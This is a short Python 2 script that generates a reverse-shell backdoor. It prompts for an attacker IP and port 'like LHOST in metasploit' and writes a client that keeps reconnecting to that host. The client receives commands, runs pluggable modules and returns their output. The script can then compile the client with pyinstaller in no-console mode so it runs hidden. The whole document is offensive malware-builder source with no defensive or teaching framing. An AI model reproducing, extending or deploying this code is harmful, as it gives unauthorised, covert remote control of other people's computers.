import cmds
commands = {}
for command in dir(cmds):
        item = getattr(cmds,command)
        if callable(item):
            x = item()
            if x.command not in commands:
                commands[x.command] = x.main
            else:
                print 'Cant import module: '+item+' because its command is already existing'
filename = raw_input('Enter Output filename: ')
ip = raw_input('enter the ip to connect back too(like LHOST in metasploit): ')
port = raw_input('enter the port to connect back too(like LPORT in metasploit): ')
backdoor = open(filename,'w')
backdoor.write('import socket,cmds,time,sock\n')
backdoor.write('HOST = "'+ip+'"\n')
backdoor.write('PORT = '+port+'\n')
backdoor.write('commands = {}\n')
backdoor.write('help = {}\n')
backdoor.write('hasarg = {}\n')
backdoor.write('for command in dir(cmds):\n')
backdoor.write('    item = getattr(cmds,command)\n')
backdoor.write('    if callable(item):\n')
backdoor.write('        x = item()\n')
backdoor.write('        if x.command not in commands:\n')
backdoor.write('            commands[x.command] = x.main\n')
backdoor.write('            help[x.command] = x.description\n')
backdoor.write('            hasarg[x.command] = x.args\n')
backdoor.write('while 1:\n')
backdoor.write('    sock.sock.news()\n')
backdoor.write('    connected = False\n')
backdoor.write('    while not connected:\n')
backdoor.write('        time.sleep(5)\n')
backdoor.write('        try:\n')
backdoor.write('            sock.sock.s.connect((HOST,PORT))\n')
backdoor.write('            connected = True\n')
backdoor.write('        except:\n')
backdoor.write('            pass\n')
backdoor.write('    while 1:\n')
backdoor.write('        data = sock.sock.s.recv(1024)\n')#add data = what sock.py recv
backdoor.write('        data = data[:len(data)-1]\n')
backdoor.write('        if data == "quit": break\n')
backdoor.write('        output = ""\n')
backdoor.write('        cmd = ""\n')
backdoor.write('        for command in commands:\n')
backdoor.write('            if data.split(" ")[0] == command:\n')
backdoor.write('                cmd = command\n')
backdoor.write('            else:\n')
backdoor.write('                output = "Command not found"\n')
backdoor.write('        if data == "help":\n')
backdoor.write('                output = ""\n')
backdoor.write('                for command in help:\n')
backdoor.write('                        output += command + " : "+help[command]\n')
backdoor.write('                sock.sock.s.send(output)\n')
backdoor.write('        elif cmd != "" and hasarg[cmd]:\n')
backdoor.write('                args = ""\n')
backdoor.write('                for v in data.split(" ")[1:len(data)]:\n')
backdoor.write('                        args = args+" " + v\n')
backdoor.write('                        output = commands[cmd](args)\n')
backdoor.write('                sock.sock.s.send(output)\n')
backdoor.write('        elif cmd != "" and not hasarg[cmd]:\n')
backdoor.write('                output = commands[cmd]()\n')
backdoor.write('                sock.sock.s.send(output)\n')
backdoor.write('        else:\n')
backdoor.write('                sock.sock.s.send("ERROR")\n')
backdoor.write('    sock.sock.s.close()\n')
backdoor.close()
if raw_input('If you have pyinstaller installed enter Y if not anything else: ') == 'Y':
    import os
    os.system('pyinstaller --onefile --noconsole backdoor.py')
